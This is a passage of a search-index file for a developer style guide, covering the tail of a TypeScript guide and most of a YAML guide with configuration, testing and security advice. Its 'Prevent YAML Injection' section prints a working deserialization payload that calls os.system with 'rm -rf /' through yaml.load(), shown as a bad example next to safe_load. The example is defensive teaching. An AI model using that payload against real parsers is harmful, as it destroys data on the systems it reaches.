user.profile.contact.email.toLowerCase();\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#avoid-generic-any-arrays","title":"\u274c Avoid: Generic any[] Arrays","text":"<pre><code>// Bad - Generic array\nfunction processItems(items: any[]) {  // \u274c Loses all type safety\n  return items.map(item =&gt; item.id);\n}\n\n// Good - Typed arrays\ninterface Item {\n  id: string;\n  name: string;\n}\n\nfunction processItems(items: Item[]): string[] {  // \u2705 Type-safe\n  return items.map(item =&gt; item.id);\n}\n\n// Or use generics for reusability\nfunction processItems&lt;T extends { id: string }&gt;(items: T[]): string[] {\n  return items.map(item =&gt; item.id);\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#avoid-disabling-typescript-checks","title":"\u274c Avoid: Disabling TypeScript Checks","text":"<pre><code>// Bad - Disabling type checking\n// @ts-ignore  // \u274c Hides real errors\nconst result = dangerousOperation();\n\n// @ts-nocheck  // \u274c Disables checking for entire file\nfunction processData(data) {\n  return data.value;\n}\n\n// Good - Fix the root cause\nfunction dangerousOperation(): unknown {  // \u2705 Proper typing\n  // Implementation\n  return {};\n}\n\nconst result = dangerousOperation();\nif (isValidResult(result)) {\n  // Use result safely\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#tool-configuration","title":"Tool Configuration","text":"","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#eslint-configuration","title":"ESLint Configuration","text":"<pre><code>{\n  \"extends\": [\n    \"eslint:recommended\",\n    \"plugin:@typescript-eslint/recommended\",\n    \"plugin:@typescript-eslint/recommended-requiring-type-checking\",\n    \"plugin:react/recommended\",\n    \"plugin:react-hooks/recommended\",\n    \"prettier\"\n  ],\n  \"parser\": \"@typescript-eslint/parser\",\n  \"parserOptions\": {\n    \"ecmaVersion\": 2022,\n    \"sourceType\": \"module\",\n    \"project\": \"./tsconfig.json\"\n  },\n  \"plugins\": [\"@typescript-eslint\", \"react\", \"react-hooks\"],\n  \"rules\": {\n    \"@typescript-eslint/no-explicit-any\": \"error\",\n    \"@typescript-eslint/no-unused-vars\": \"error\",\n    \"@typescript-eslint/explicit-function-return-type\": \"warn\",\n    \"react/react-in-jsx-scope\": \"off\"\n  }\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#prettier-configuration","title":"Prettier Configuration","text":"<pre><code>{\n  \"printWidth\": 100,\n  \"tabWidth\": 2,\n  \"useTabs\": false,\n  \"semi\": true,\n  \"singleQuote\": true,\n  \"trailingComma\": \"es5\",\n  \"bracketSpacing\": true,\n  \"arrowParens\": \"always\"\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#packagejson-scripts","title":"package.json Scripts","text":"<pre><code>{\n  \"scripts\": {\n    \"dev\": \"next dev\",\n    \"build\": \"tsc &amp;&amp; next build\",\n    \"start\": \"next start\",\n    \"lint\": \"eslint . --ext .ts,.tsx\",\n    \"lint:fix\": \"eslint . --ext .ts,.tsx --fix\",\n    \"format\": \"prettier --write \\\"**/*.{ts,tsx,json,md}\\\"\",\n    \"type-check\": \"tsc --noEmit\",\n    \"test\": \"vitest\",\n    \"test:coverage\": \"vitest --coverage\"\n  }\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#see-also","title":"See Also","text":"","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#related-language-guides","title":"Related Language Guides","text":"<ul> <li>Python Style Guide - Similar modern type-safe development</li> <li>JavaScript/JSON Guide - JSON data structures and APIs</li> <li>Bash Style Guide - Build scripts and automation</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#development-tools-practices","title":"Development Tools &amp; Practices","text":"<ul> <li>IDE Integration Guide - VS Code, WebStorm setup</li> <li>Pre-commit Hooks Guide - ESLint, Prettier automation</li> <li>Local Validation Setup - Node.js, npm/pnpm setup</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#testing-quality","title":"Testing &amp; Quality","text":"<ul> <li>Testing Strategies - Jest, Playwright, Cypress patterns</li> <li>Security Scanning Guide - npm audit, Snyk integration</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#cicd-integration","title":"CI/CD Integration","text":"<ul> <li>GitHub Actions Guide - Node.js workflow examples</li> <li>GitLab CI Guide - TypeScript pipeline configuration</li> <li>AI Validation Pipeline - Automated code review</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#infrastructure-deployment","title":"Infrastructure &amp; Deployment","text":"<ul> <li>AWS CDK Guide - Infrastructure as Code with TypeScript</li> <li>Dockerfile Guide - Node.js containerization</li> <li>Docker Compose Guide - Multi-container applications</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#templates-examples","title":"Templates &amp; Examples","text":"<ul> <li>TypeScript Library Example - Complete library setup</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#core-documentation","title":"Core Documentation","text":"<ul> <li>Getting Started Guide - Repository setup</li> <li>Metadata Schema Reference - Frontmatter requirements</li> <li>Principles - Style guide philosophy</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#references","title":"References","text":"","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#official-documentation","title":"Official Documentation","text":"<ul> <li>TypeScript Documentation</li> <li>TypeScript Handbook</li> <li>React TypeScript Cheatsheet</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#frameworks","title":"Frameworks","text":"<ul> <li>Next.js with TypeScript</li> <li>NestJS Documentation</li> <li>Express with TypeScript</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#tools","title":"Tools","text":"<ul> <li>ESLint TypeScript Plugin</li> <li>Prettier</li> <li>Vitest</li> <li>ts-node</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#best-practices","title":"Best Practices","text":"<ul> <li>TypeScript Deep Dive</li> <li>Effective TypeScript</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/yaml/","title":"YAML Style Guide","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#language-overview","title":"Language Overview","text":"<p>YAML (YAML Ain't Markup Language) is a human-readable data serialization language commonly used for configuration files, infrastructure as code, and data exchange. This guide covers YAML standards for consistent and maintainable configuration.</p>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: Data serialization, configuration</li> <li>File Extension: <code>.yaml</code>, <code>.yml</code> (prefer <code>.yaml</code>)</li> <li>Primary Use: Configuration files, Kubernetes manifests, CI/CD pipelines, Ansible playbooks</li> <li>Indentation: 2 spaces (never tabs)</li> </ul>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Syntax Indentation 2 spaces <code>key: value</code> Never tabs, always 2 spaces Key-Value <code>key: value</code> <code>name: John</code> Space after colon Lists <code>- item</code> <code>- apple</code> Dash followed by space Multi-line <code>\\|</code> or <code>&gt;</code> <code>description: \\| text</code> <code>\\|</code> preserves newlines, <code>&gt;</code> folds Data Types String Unquoted or quoted <code>name: John</code> or <code>name: \"John\"</code> Quote when special chars Number Numeric <code>count: 42</code>, <code>pi: 3.14</code> Integer or float Boolean <code>true</code>/<code>false</code> <code>enabled: true</code> Lowercase Null <code>null</code> or <code>~</code> <code>value: null</code> Explicit null Collections Mapping <code>key: value</code> <code>person:\\n  name: John</code> Nested objects Sequence <code>- item</code> <code>fruits:\\n  - apple</code> Arrays/lists Inline Map <code>{key: value}</code> <code>{name: John, age: 30}</code> Flow style Inline List <code>[item1, item2]</code> <code>[1, 2, 3]</code> Flow style Files Extension <code>.yaml</code> preferred <code>config.yaml</code>, <code>values.yaml</code> Avoid <code>.yml</code> Multiple Docs <code>---</code> separator <code>---\\ndoc1\\n---\\ndoc2</code> Multiple YAML docs in one file Best Practices Quotes Quote when needed <code>version: \"1.20\"</code> Avoid type coercion Comments <code># comment</code> <code># Configuration</code> Hash for comments Anchors <code>&amp;anchor</code> <code>defaults: &amp;defaults</code> Reuse with <code>*anchor</code> Merge Keys <code>&lt;&lt;: *anchor</code> <code>&lt;&lt;: *defaults</code> Merge referenced keys","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#basic-syntax","title":"Basic Syntax","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#indentation","title":"Indentation","text":"<p>Always use 2 spaces for indentation:</p> <pre><code>## Good - 2 spaces\nservices:\n  web:\n    image: nginx:latest\n    ports:\n      - \"80:80\"\n\n## Bad - 4 spaces or tabs\nservices:\n    web:\n        image: nginx:latest\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#key-value-pairs","title":"Key-Value Pairs","text":"<pre><code>## Simple key-value pairs\nname: my-application\nversion: 1.0.0\nenvironment: production\n\n## Nested structures\ndatabase:\n  host: localhost\n  port: 5432\n  credentials:\n    username: admin\n    password: secret\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#data-types","title":"Data Types","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#strings","title":"Strings","text":"<pre><code>## Unquoted strings (preferred for simple strings)\nname: my-application\ndescription: A simple web application\n\n## Quoted strings (use when needed)\nmessage: \"String with: special characters\"\npath: 'C:\\Windows\\System32'\n\n## Multi-line strings - literal block (preserves newlines)\nscript: |\n  #!/bin/bash\n  echo \"Hello World\"\n  exit 0\n\n## Multi-line strings - folded block (single line)\ndescription: &gt;\n  This is a long description\n  that will be folded into\n  a single line.\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#numbers","title":"Numbers","text":"<pre><code>## Integers\ncount: 42\nport: 8080\n\n## Floats\npi: 3.14159\npercentage: 99.9\n\n## Exponential notation\nscientific: 1.23e-4\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#booleans","title":"Booleans","text":"<pre><code>## Preferred boolean values\nenabled: true\ndisabled: false\n\n## Avoid these (but they work)\n## legacy_enabled: yes\n## legacy_disabled: no\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#null-values","title":"Null Values","text":"<pre><code>## Explicit null\nvalue: null\n\n## Implicit null (empty value)\nempty_value:\n\n## Tilde also means null\nanother_null: ~\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#collections","title":"Collections","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#lists","title":"Lists","text":"<pre><code>## Dash notation (preferred)\nfruits:\n  - apple\n  - banana\n  - orange\n\n## Flow style (use sparingly)\ncolors: [red, green, blue]\n\n## List of objects\nusers:\n  - name: Alice\n    role: admin\n  - name: Bob\n    role: user\n\n## Empty list\nempty_list: []\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#dictionaries","title":"Dictionaries","text":"<pre><code>## Nested dictionaries\napplication:\n  name: my-app\n  version: 1.0.0\n  config:\n    database:\n      host: localhost\n      port: 5432\n    cache:\n      type: redis\n      ttl: 3600\n\n## Empty dictionary\nempty_dict: {}\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#kubernetes-yaml","title":"Kubernetes YAML","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#pod-definition","title":"Pod Definition","text":"<pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  namespace: default\n  labels:\n    app: nginx\n    environment: production\nspec:\n  containers:\n    - name: nginx\n      image: nginx:1.21-alpine\n      ports:\n        - containerPort: 80\n          protocol: TCP\n      resources:\n        requests:\n          cpu: 100m\n          memory: 128Mi\n        limits:\n          cpu: 500m\n          memory: 512Mi\n      env:\n        - name: NGINX_HOST\n          value: example.com\n        - name: NGINX_PORT\n          value: \"80\"\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#deployment","title":"Deployment","text":"<pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-deployment\n  labels:\n    app: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n        - name: web\n          image: nginx:1.21-alpine\n          ports:\n            - containerPort: 80\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#docker-compose-yaml","title":"Docker Compose YAML","text":"<pre><code>version: '3.8'\n\nservices:\n  web:\n    image: nginx:alpine\n    container_name: web-server\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - ./html:/usr/share/nginx/html:ro\n      - ./conf/nginx.conf:/etc/nginx/nginx.conf:ro\n    environment:\n      - NGINX_HOST=example.com\n      - NGINX_PORT=80\n    networks:\n      - frontend\n    depends_on:\n      - api\n    restart: unless-stopped\n\n  api:\n    build:\n      context: ./api\n      dockerfile: Dockerfile\n    container_name: api-server\n    ports:\n      - \"8080:8080\"\n    environment:\n      DATABASE_URL: postgresql://user:pass@db:5432/mydb\n    networks:\n      - frontend\n      - backend\n    depends_on:\n      - db\n\n  db:\n    image: postgres:15-alpine\n    container_name: postgres-db\n    environment:\n      POSTGRES_USER: user\n      POSTGRES_PASSWORD: pass\n      POSTGRES_DB: mydb\n    volumes:\n      - postgres_data:/var/lib/postgresql/data\n    networks:\n      - backend\n    restart: unless-stopped\n\nnetworks:\n  frontend:\n    driver: bridge\n  backend:\n    driver: bridge\n\nvolumes:\n  postgres_data:\n    driver: local\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#github-actions-yaml","title":"GitHub Actions YAML","text":"<pre><code>name: CI Pipeline\n\non:\n  push:\n    branches:\n      - main\n      - develop\n  pull_request:\n    branches:\n      - main\n\nenv:\n  NODE_VERSION: '18'\n  PYTHON_VERSION: '3.11'\n\njobs:\n  test:\n    name: Run Tests\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node-version: [16, 18, 20]\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node-version }}\n          cache: 'npm'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Run tests\n        run: npm test\n\n      - name: Upload coverage\n        uses: codecov/codecov-action@v3\n        with:\n          file: ./coverage/lcov.info\n\n  build:\n    name: Build Application\n    runs-on: ubuntu-latest\n    needs: test\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Build Docker image\n        run: docker build -t myapp:${{ github.sha }} .\n\n      - name: Push to registry\n        if: github.ref == 'refs/heads/main'\n        run: |\n          echo \"${{ secrets.DOCKER_PASSWORD }}\" | docker login -u \"${{ secrets.DOCKER_USERNAME }}\" --password-stdin\n          docker push myapp:${{ github.sha }}\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#ansible-yaml","title":"Ansible YAML","text":"<pre><code>---\n- name: Configure web servers\n  hosts: webservers\n  become: true\n  vars:\n    nginx_version: \"1.21\"\n    app_port: 8080\n\n  tasks:\n    - name: Update apt cache\n      ansible.builtin.apt:\n        update_cache: true\n        cache_valid_time: 3600\n\n    - name: Install nginx\n      ansible.builtin.apt:\n        name: nginx\n        state: present\n\n    - name: Copy nginx configuration\n      ansible.builtin.template:\n        src: nginx.conf.j2\n        dest: /etc/nginx/nginx.conf\n        owner: root\n        group: root\n        mode: '0644'\n      notify: Reload nginx\n\n    - name: Ensure nginx is running\n      ansible.builtin.service:\n        name: nginx\n        state: started\n        enabled: true\n\n  handlers:\n    - name: Reload nginx\n      ansible.builtin.service:\n        name: nginx\n        state: reloaded\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#comments","title":"Comments","text":"<pre><code>## Single-line comment\n\n## Multi-line comment block\n## that spans multiple lines\n## to explain complex configuration\n\nservices:\n  web:\n    image: nginx:latest  # Inline comment\n    ports:\n      - \"80:80\"  # HTTP port\n      - \"443:443\"  # HTTPS port\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#anchors-and-aliases","title":"Anchors and Aliases","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#reusing-configuration","title":"Reusing Configuration","text":"<pre><code>## Define anchor with &amp;\ndefault_settings: &amp;defaults\n  timeout: 30\n  retries: 3\n  log_level: info\n\n## Reuse with *\nproduction:\n  &lt;&lt;: *defaults\n  environment: production\n\nstaging:\n  &lt;&lt;: *defaults\n  environment: staging\n  timeout: 60  # Override specific value\n\n## List anchors\ncommon_env: &amp;common_env\n  - name: APP_NAME\n    value: my-app\n  - name: LOG_LEVEL\n    value: info\n\nservice_a:\n  env: *common_env\n\nservice_b:\n  env: *common_env\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#testing","title":"Testing","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#yaml-linting","title":"YAML Linting","text":"<p>Use yamllint to validate YAML files:</p> <pre><code>## Install yamllint\npip install yamllint\n\n## Lint single file\nyamllint config.yaml\n\n## Lint all YAML files\nyamllint .\n\n## Lint with custom config\nyamllint -c .yamllint.yaml config.yaml\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#yamllint-configuration","title":"yamllint Configuration","text":"<pre><code>## .yamllint.yaml\nextends: default\n\nrules:\n  line-length:\n    max: 120\n    level: warning\n  indentation:\n    spaces: 2\n    indent-sequences: true\n  comments:\n    min-spaces-from-content: 2\n  document-start:\n    present: true\n  truthy:\n    allowed-values: ['true', 'false']\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#schema-validation","title":"Schema Validation","text":"<p>Validate YAML against JSON Schema:</p> <pre><code>## Install check-jsonschema\npip install check-jsonschema\n\n## Validate against schema\ncheck-jsonschema --schemafile schema.json config.yaml\n\n## Validate multiple files\ncheck-jsonschema --schemafile schema.json configs/*.yaml\n</code></pre> <p>Example schema:</p> <pre><code>{\n  \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n  \"type\": \"object\",\n  \"required\": [\"version\", \"services\"],\n  \"properties\": {\n    \"version\": {\n      \"type\": \"string\",\n      \"pattern\": \"^[0-9]+\\\\.[0-9]+$\"\n    },\n    \"services\": {\n      \"type\": \"object\",\n      \"patternProperties\": {\n        \"^[a-z][a-z0-9-]*$\": {\n          \"type\": \"object\",\n          \"required\": [\"image\"],\n          \"properties\": {\n            \"image\": {\n              \"type\": \"string\"\n            },\n            \"ports\": {\n              \"type\": \"array\",\n              \"items\": {\n                \"type\": \"string\",\n                \"pattern\": \"^[0-9]+:[0-9]+$\"\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#testing-with-yq","title":"Testing with yq","text":"<p>Validate and test YAML structure:</p> <pre><code>## Check if file is valid YAML\nyq eval '.' config.yaml &gt; /dev/null\n\n## Test specific values\nversion=$(yq eval '.version' config.yaml)\nif [ \"$version\" != \"1.0\" ]; then\n  echo \"Invalid version: $version\"\n  exit 1\nfi\n\n## Test array length\ncount=$(yq eval '.services | length' config.yaml)\nif [ \"$count\" -lt 1 ]; then\n  echo \"Must have at least one service\"\n  exit 1\nfi\n\n## Test nested values\nimage=$(yq eval '.services.web.image' config.yaml)\nif [ -z \"$image\" ]; then\n  echo \"Web service must have image\"\n  exit 1\nfi\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#unit-testing-yaml","title":"Unit Testing YAML","text":"<pre><code>## tests/test_yaml_config.py\nimport yaml\nimport pytest\n\ndef load_yaml(filename):\n    with open(filename, 'r') as f:\n        return yaml.safe_load(f)\n\ndef test_config_structure():\n    config = load_yaml('config.yaml')\n\n    assert 'version' in config\n    assert 'services' in config\n    assert isinstance(config['services'], dict)\n\ndef test_service_configuration():\n    config = load_yaml('config.yaml')\n\n    for name, service in config['services'].items():\n        assert 'image' in service, f\"Service {name} missing image\"\n        assert isinstance(service.get('environment', {}), dict)\n\ndef test_environment_specific_config():\n    prod_config = load_yaml('config.production.yaml')\n\n    assert prod_config['environment'] == 'production'\n    assert prod_config['debug'] is False\n    assert 'ssl' in prod_config\n    assert prod_config['ssl']['enabled'] is True\n\n@pytest.mark.parametrize(\"env\", [\"development\", \"staging\", \"production\"])\ndef test_all_environments(env):\n    config = load_yaml(f'config.{env}.yaml')\n\n    assert config['environment'] == env\n    assert 'database' in config\n    assert 'host' in config['database']\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#cicd-integration","title":"CI/CD Integration","text":"<pre><code>## .github/workflows/yaml-test.yml\nname: YAML Validation\n\non: [push, pull_request]\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install yamllint\n        run: pip install yamllint\n\n      - name: Lint YAML files\n        run: yamllint .\n\n      - name: Install yq\n        run: |\n          wget https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64\n          chmod +x yq_linux_amd64\n          sudo mv yq_linux_amd64 /usr/local/bin/yq\n\n      - name: Validate structure\n        run: |\n          for file in config*.yaml; do\n            echo \"Validating $file\"\n            yq eval '.' \"$file\" &gt; /dev/null\n          done\n\n  schema-validation:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install check-jsonschema\n        run: pip install check-jsonschema\n\n      - name: Validate against schema\n        run: |\n          check-jsonschema --schemafile schema.json config.yaml\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#testing-with-docker-compose","title":"Testing with Docker Compose","text":"<p>Test YAML in context:</p> <pre><code>## tests/test-compose.sh\n#!/bin/bash\nset -e\n\necho \"Testing docker-compose.yaml...\"\n\n## Validate syntax\ndocker-compose -f docker-compose.yaml config &gt; /dev/null\n\n## Test in dry-run mode\ndocker-compose -f docker-compose.yaml up --dry-run\n\n## Validate services defined\nservices=$(docker-compose -f docker-compose.yaml config --services)\nexpected_services=\"web db redis\"\n\nfor service in $expected_services; do\n  if ! echo \"$services\" | grep -q \"^${service}$\"; then\n    echo \"ERROR: Service $service not found\"\n    exit 1\n  fi\ndone\n\necho \"docker-compose.yaml is valid\"\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#pre-commit-hooks","title":"Pre-commit Hooks","text":"<pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: check-yaml\n        args: ['--safe']\n\n  - repo: https://github.com/adrienverge/yamllint\n    rev: v1.33.0\n    hooks:\n      - id: yamllint\n        args: ['-c', '.yamllint.yaml']\n\n  - repo: https://github.com/python-jsonschema/check-jsonschema\n    rev: 0.27.0\n    hooks:\n      - id: check-jsonschema\n        name: Validate configs\n        files: ^config.*\\.yaml$\n        args: ['--schemafile', 'schema.json']\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#diff-testing","title":"Diff Testing","text":"<p>Compare YAML configurations:</p> <pre><code>## Install dyff\nbrew install homeport/tap/dyff\n\n## Compare configurations\ndyff between config.staging.yaml config.production.yaml\n\n## Output in different formats\ndyff between --output human config.staging.yaml config.production.yaml\ndyff between --output yaml config.staging.yaml config.production.yaml\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#security-scanning","title":"Security Scanning","text":"<p>Scan for secrets in YAML:</p> <pre><code>## Install detect-secrets\npip install detect-secrets\n\n## Scan YAML files\ndetect-secrets scan config*.yaml\n\n## Create baseline\ndetect-secrets scan --baseline .secrets.baseline config*.yaml\n\n## Audit findings\ndetect-secrets audit .secrets.baseline\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#performance-testing","title":"Performance Testing","text":"<p>Test YAML parsing performance:</p> <pre><code>## tests/test_yaml_performance.py\nimport yaml\nimport time\n\ndef test_large_yaml_performance():\n    start = time.time()\n\n    with open('large-config.yaml', 'r') as f:\n        config = yaml.safe_load(f)\n\n    duration = time.time() - start\n\n    assert duration &lt; 1.0, f\"YAML parsing too slow: {duration}s\"\n    assert config is not None\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#security-best-practices","title":"Security Best Practices","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#never-store-secrets-in-yaml","title":"Never Store Secrets in YAML","text":"<p>YAML files are often committed to version control:</p> <pre><code>## Bad - Secrets in YAML\ndatabase:\n  host: db.example.com\n  password: MySecretPassword123  # \u274c Exposed in version control!\n  api_key: sk-1234567890abcdef   # \u274c Hardcoded secret!\n\n## Good - Environment variable references\ndatabase:\n  host: ${DB_HOST}\n  password: ${DB_PASSWORD}  # \u2705 From environment\n  api_key: ${API_KEY}\n\n## Good - External secret references\ndatabase:\n  host: db.example.com\n  password: !vault |\n    $ANSIBLE_VAULT;1.1;AES256\n    ...encrypted...\n  api_key: ssm:///myapp/api-key  # AWS Systems Manager Parameter Store\n</code></pre> <p>Key Points:</p> <ul> <li>Never commit secrets to YAML files in version control</li> <li>Use environment variables for sensitive data</li> <li>Use secret management (Ansible Vault, Sealed Secrets, SOPS)</li> <li>Scan repositories for accidentally committed secrets</li> <li>Encrypt sensitive YAML files at rest</li> </ul>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#prevent-yaml-injection","title":"Prevent YAML Injection","text":"<p>Untrusted YAML can execute arbitrary code in some parsers:</p> <pre><code>## Bad - Unsafe YAML loading\nimport yaml\n\nuser_input = \"\"\"\n!!python/object/apply:os.system\nargs: ['rm -rf /']\n\"\"\"\ndata = yaml.load(user_input)  # \u274c Code execution vulnerability!\n\n## Good - Safe YAML loading\nimport yaml\n\nuser_input = \"\"\"\nname: John\nage: 30\n\"\"\"\ndata = yaml.safe_load(user_input)  # \u2705 Safe - no code execution\n\n## Good - Validate with schema\nfrom yamale import make_schema, make_data, validate\n\nschema = make_schema('schema.yaml')\ndata = make_data('config.yaml')\nvalidate(schema, data)  # \u2705 Validated against schema\n</code></pre> <p>Key Points:</p> <ul> <li>Always use <code>safe_load()</code> instead of <code>load()</code></li> <li>Never parse untrusted YAML with <code>yaml.load()</code></li> <li>Validate YAML against schemas</li> <li>Sanitize user inputs before YAML encoding</li> <li>Use YAML parsers with security in mind</li> </ul>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#validate-yaml-schema","title":"Validate YAML Schema","text":"<p>Define and enforce schemas for all YAML configurations:</p> <pre><code>## schema.yaml (using JSON Schema)\ntype: object\nproperties:\n  name:\n    type: string\n    pattern: '^[a-zA-Z0-9_-]+$'\n  email:\n    type: string\n    format: email\n  age:\n    type: integer\n    minimum: 0\n    maximum: 150\nrequired:\n  - name\n  - email\nadditionalProperties: false  # Prevent unexpected properties\n</code></pre> <pre><code>## Good - Validate YAML\nimport yaml\nimport jsonschema\n\nwith open('schema.yaml') as f:\n    schema = yaml.safe_load(f)\n\nwith open('config.yaml') as f:\n    config = yaml.safe_load(f)\n\njsonschema.validate(config, schema)  # \u2705 Validated\n</code></pre> <p>Key Points:</p> <ul> <li>Define schemas for all YAML files</li> <li>Validate on load</li> <li>Use <code>additionalProperties: false</code> to prevent injection</li> <li>Enforce type and format constraints</li> <li>Fail fast on invalid YAML</li> </ul>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#file-permissions","title":"File Permissions","text":"<p>Protect YAML configuration files:</p> <pre><code>## Good - Restrictive permissions\n# Application configuration\nchmod 640 config.yaml\nchown app:app config.yaml\n\n# Secrets (Kubernetes secrets, etc.)\nchmod 600 secrets.yaml\nchown app:app secrets.yaml\n\n# Public configuration\nchmod 644 public-config.yaml\n</code></pre> <p>Key Points:</p> <ul> <li>Set restrictive file permissions (600-644)</li> <li>Use appropriate ownership</li> <li>Never make secrets world-readable</li> <li>Audit file access regularly</li> <li>Encrypt sensitive YAML at rest</li> </ul>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#kubernetes-secrets","title":"Kubernetes Secrets","text":"<p>Properly handle secrets in Kubernetes YAML:</p> <pre><code>## Bad - Base64 is NOT encryption!\napiVersion: v1\nkind: 